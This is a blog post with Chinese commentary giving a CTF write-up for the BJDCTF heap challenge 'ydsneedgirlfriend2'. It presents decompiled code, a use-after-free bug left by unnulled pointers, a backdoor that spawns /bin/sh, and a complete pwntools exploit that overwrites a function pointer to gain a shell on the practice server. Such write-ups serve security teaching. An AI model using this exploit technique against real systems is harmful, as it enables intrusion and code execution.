---
layout: post
title:  ydsneedgirlfriend2
date:   2021-02-08 00:01:01 +0300
image:  2021-02-08-egret.jpg
tags:   [ctf,PWN,UAF,BJDCTF,heap]
---

#### main

```assembly
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char buf; // [rsp+12h] [rbp-Eh]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  myinit();
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      read(0, &buf, 6uLL);
      v3 = atoi(&buf);
      if ( v3 != 2 )
        break;
      dele();
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        show();
      }
      else
      {
        if ( v3 == 4 )
          exit(0);
LABEL_13:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( v3 != 1 )
        goto LABEL_13;
      add();
    }
  }
}
```

#### menu()

```assembly
int menu()
{
  puts(&byte_400E6F);
  puts("1.add a girlfriend");
  puts("2.dele a girlfriend");
  puts("3.show a girlfriend");
  puts("4.exit");
  return puts("u choice :");
}
```

#### add()

```assembly
unsigned __int64 add()
{
  void **v0; // rbx
  int nbytes; // [rsp+8h] [rbp-28h]
  char buf; // [rsp+10h] [rbp-20h]
  unsigned __int64 v4; // [rsp+18h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  if ( count > 7 )
  {
    puts("Full!");
    exit(-1);
  }
  if ( !girlfriends[0] )
  {
    girlfriends[0] = malloc(0x10uLL);
    if ( !girlfriends[0] )
    {
      perror("malloc failed=");
      exit(-1);
    }
  }
  *(_QWORD *)(girlfriends[0] + 8LL) = print_girlfriend_name;
  puts("Please input the length of her name:");
  read(0, &buf, 8uLL);
  nbytes = atoi(&buf);
  v0 = (void **)girlfriends[0];
  *v0 = malloc(nbytes);
  if ( !*(_QWORD *)girlfriends[0] )
  {
    perror("name malloc failed=");
    exit(-1);
  }
  puts("Please tell me her name:");
  read(0, *(void **)girlfriends[0], (unsigned int)nbytes);
  puts("what a beautiful name! Thank you on behalf of yds!");
  ++count;
  return __readfsqword(0x28u) ^ v4;
}
```

*(_QWORD *)(girlfriends[0] + 8LL) = print_girlfriend_name;

在girlfriends数组中存放着print_girlfriend_name()函数的指针。

#### dele()

```assembly
unsigned __int64 dele()
{
  int v1; // [rsp+0h] [rbp-10h]
  char buf; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, &buf, 4uLL);
  v1 = atoi(&buf);
  if ( v1 >= 0 && v1 < count )
  {
    if ( girlfriends[v1] )
    {
      free(*(void **)girlfriends[v1]);
      free((void *)girlfriends[v1]);
      puts("Why are u so cruel!");
    }
  }
  else
  {
    puts("Out of bound!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

存在UAF漏洞，只是free掉了指针和context，但是没有置为NULL。

#### show()

```assembly
unsigned __int64 show()
{
  int v1; // [rsp+0h] [rbp-10h]
  char buf; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, &buf, 4uLL);
  v1 = atoi(&buf);
  if ( v1 >= 0 && v1 < count )
  {
    if ( girlfriends[v1] )
      (*(void (__fastcall **)(_QWORD, char *))(girlfriends[v1] + 8LL))(girlfriends[v1], &buf);
  }
  else
  {
    puts("Out of bound!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

如果girlfriends[v1]不为空，就调用(girlfriends[v1] + 8LL)，而(girlfriends[v1] + 8LL)则为add()函数中的print_girlfriend_name。

#### print_girlfriend_name()

```assembly
int __fastcall print_girlfriend_name(const char **a1)
{
  return puts(*a1);
}
```

#### backdoor

```assembly
int backdoor()
{
  puts("YDS got N+ girlfriends!");
  return system("/bin/sh");
}
```

所以我们将该函数的指针改写为backdoor()函数的地址，则在调用show()时，就会运行backdoor。

堆的结构

![]({{site.baseurl}}/img/2021-02-08-addr.jpg)

```assembly
.text:00000000004009AB ; =============== S U B R O U T I N E ============================
.text:00000000004009AB
.text:00000000004009AB ; Attributes: bp-based frame
.text:00000000004009AB
.text:00000000004009AB                 public print_girlfriend_name
.text:00000000004009AB print_girlfriend_name proc near         ; DATA XREF: add+D4↓o
.text:00000000004009AB
.text:00000000004009AB var_8           = qword ptr -8
.text:00000000004009AB
.text:00000000004009AB ; __unwind {
.text:00000000004009AB                 push    rbp
.text:00000000004009AC                 mov     rbp, rsp
.text:00000000004009AF                 sub     rsp, 10h
.text:00000000004009B3                 mov     [rbp+var_8], rdi
.text:00000000004009B7                 mov     rax, [rbp+var_8]
.text:00000000004009BB                 mov     rax, [rax]
.text:00000000004009BE                 mov     rdi, rax        ; s
.text:00000000004009C1                 call    _puts
.text:00000000004009C6                 nop
.text:00000000004009C7                 leave
.text:00000000004009C8                 retn
.text:00000000004009C8 ; } // starts at 4009AB
.text:00000000004009C8 print_girlfriend_name endp
```

exp

```assembly
from pwn import *

io = remote("node3.buuoj.cn",27402)

def add(length, name):
    io.recvuntil("u choice :")
    io.sendline("1")
    io.recvuntil("Please input the length of her name:")
    io.sendline(str(length))
    io.recvuntil("Please tell me her name:")
    io.sendline(name)

def dele(index):
    io.recvuntil("u choice :")
    io.sendline("2")
    io.recvuntil("Index :")
    io.sendline(str(index))

def show(index):
    io.recvuntil("u choice :")
    io.sendline("3")
    io.recvuntil("Index :")
    io.sendline(str(index))

backdoor = 0x400d86
add(0x20, "aaaa")
dele(0)
add(0x10, "aaaaaaaa" + p64(backdoor))
show(0)
    
io.interactive()
```

